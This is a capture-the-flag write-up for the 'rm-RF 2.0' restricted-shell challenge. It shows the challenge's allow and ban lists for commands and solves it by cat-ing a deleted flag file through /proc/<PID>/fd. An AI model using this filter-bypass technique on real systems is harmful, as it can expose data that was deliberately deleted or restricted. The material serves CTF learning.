# Challenge name; rm-RF 2.0

### Author: Gourav Suram

### Desc

```
more like a shell

Netcat:
nc rmrf.ctf.teamquark.com 65322

For better experience:
rlwrap nc rmrf.ctf.teamquark.com 65322

```

# Writeup

```python

with open('./flag.txt', 'w') as flag:
    flag.write('quarkCTF{fake_flag_for_testing}')

flag = open('./flag.txt', 'r')

```

- It's creating a file called `flag.txt`
- Later it's reading the contents of flag and storing it in flag variable.


- The user can input commands but are filtered by the prgm on basis of : 

```python

def is_safe_command(cmd):
    allow = ['cat', 'ls', 'whoami', 'cd', 'ps', 'uname', 'date', 'wc']
    ban = ['rm', 'flag.txt', 'flag', 'chall.py', 'chall']
    for i in ban:
        if i in cmd:
            return False
    for i in allow:
        if (i in cmd):
            pattern = r'^[a-zA-Z0-9/. \-]+$'
            return bool(re.match(pattern, cmd))
    return False

```

- only commands under `allow` list can be executed.
- And regex of commands can only contain alpha numberic values with `. / -` in special characters
- And there's a ban list (ofc) which doesn't allow user to have those in their cmd.


- Following snippet tells us that server is deleting flag.txt if commands are executed on the shell

```python

    global count
    if line:
        count += 1
    if count > 1 and count < 3:
        #demnnnnn cmds are runninggggggggg on my shell
        os.system('rm ./flag.txt')

```

- hmmmmm, how to read flag.txt if it's getting deleted.
- As you know, `Everything in linux is a file`.
- This includes processes as well

#### Soln

- We can read the flag.txt because the `flag` variable inside the program has read it/load it.
- We just have to locate the process of the python program and read the files

- What does this mean?

```(gpt)

In Linux, /proc/<PID>/fd is a directory that contains symbolic links to the file
descriptors opened by the process with the corresponding process ID (PID).
Each entry in this directory represents a file descriptor (fd) of the process.


A file descriptor is a non-negative integer used to uniquely identify
an open file within a process. It serves as a reference to a file or
other input/output resource, such as a socket or a pipe.

```

- If a program opens a files, the data get's stored inside the /fd directory until the prgm exits.


#### Flag

```bash

user@rmRF$ ps
    PID TTY          TIME CMD
    193 ?        00:00:00 socat
    194 ?        00:00:00 python3
    196 ?        00:00:00 ps

```

- Yess there's our process id (194)
- If we list our fd

```bash

user@rmRF$ ls -la /proc/194/fd/
total 0
dr-x------. 2 ctf ctf  0 Feb 19 17:51 .
dr-xr-xr-x. 9 ctf ctf  0 Feb 19 17:51 ..
lrwx------. 1 ctf ctf 64 Feb 19 17:52 0 -> socket:[101506]
lrwx------. 1 ctf ctf 64 Feb 19 17:52 1 -> socket:[101506]
l-wx------. 1 ctf ctf 64 Feb 19 17:52 2 -> pipe:[38355]
lrwx------. 1 ctf ctf 64 Feb 19 17:52 3 -> socket:[101509]
lrwx------. 1 ctf ctf 64 Feb 19 17:52 4 -> socket:[101510]
lr-x------. 1 ctf ctf 64 Feb 19 17:51 5 -> /home/ctf/challenge/flag.txt (deleted)
lr-x------. 1 ctf ctf 64 Feb 19 17:52 6 -> pipe:[101546]
lrwx------. 1 ctf ctf 64 Feb 19 17:52 8 -> socket:[101507]

```

> lr-x------. 1 ctf ctf 64 Feb 19 17:51 5 -> /home/ctf/challenge/flag.txt (deleted)

- We can see our deleted file listed here.
- just cat it and grab the flag

```bash

user@rmRF$ cat /proc/194/fd/5
quarkCTF{D3lEt3D_fiL35_4r3_in-FD}

```
